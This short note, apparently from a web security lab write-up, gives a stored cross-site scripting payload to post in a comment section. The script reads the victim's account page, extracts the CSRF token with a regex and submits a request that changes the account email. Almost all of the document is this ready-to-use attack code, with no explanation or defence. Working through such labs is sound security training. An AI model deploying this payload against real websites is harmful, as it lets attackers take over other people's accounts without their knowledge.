# change email to bypass the CSRF

- You have to use the payload in the comment section.

```jsx
<script>
var req = new XMLHttpRequest();
req.onload = change_email;
req.open('get', '/my-account', true);
req.send();
function change_email(){
	var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	var newreq = new XMLHttpRequest();
	newreq.open('post', '/my-account/change-email',true);
	newreq.send('email=hello@gmail.com&csrf='+csrf_token);
};
</script>
```